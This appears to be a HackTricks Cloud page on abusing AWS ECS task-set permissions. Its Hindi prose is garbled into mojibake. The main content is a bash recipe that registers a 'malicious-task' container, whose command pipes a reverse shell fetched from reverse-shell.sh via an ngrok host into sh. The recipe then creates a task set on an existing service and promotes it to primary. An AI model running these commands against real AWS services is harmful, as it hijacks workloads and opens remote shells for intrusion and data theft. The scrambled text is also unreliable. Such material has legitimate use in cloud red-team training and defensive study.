‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ú‡§ø‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Å `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, ‡§î‡§∞ `ecs:DescribeTaskSets` ‡§π‡•à‡§Ç, ‡§µ‡§π **‡§è‡§ï ‡§Æ‡•å‡§ú‡•Ç‡§¶‡§æ ECS ‡§∏‡•á‡§µ‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§∏‡•á‡§ü ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§™‡•ç‡§∞‡§æ‡§•‡§Æ‡§ø‡§ï ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§∏‡•á‡§ü ‡§ï‡•ã ‡§Ö‡§™‡§°‡•á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à**‡•§ ‡§á‡§∏‡§∏‡•á ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã **‡§∏‡•á‡§µ‡§æ ‡§ï‡•á ‡§≠‡•Ä‡§§‡§∞ ‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à‡•§
```bash
bashCopy code# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ**: ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∏‡•á‡§µ‡§æ ‡§Æ‡•á‡§Ç ‡§Æ‡§®‡§ö‡§æ‡§π‡§æ ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç, ‡§ú‡•ã ‡§á‡§∏‡§ï‡•Ä ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•ã ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§Ø‡§æ ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§è‡§ï‡•ç‡§∏‡§´‡§ø‡§≤‡•ç‡§ü‡•ç‡§∞‡•á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **‡§π‡§Æ‡§æ‡§∞‡•á** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** üê¶ ‡§™‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
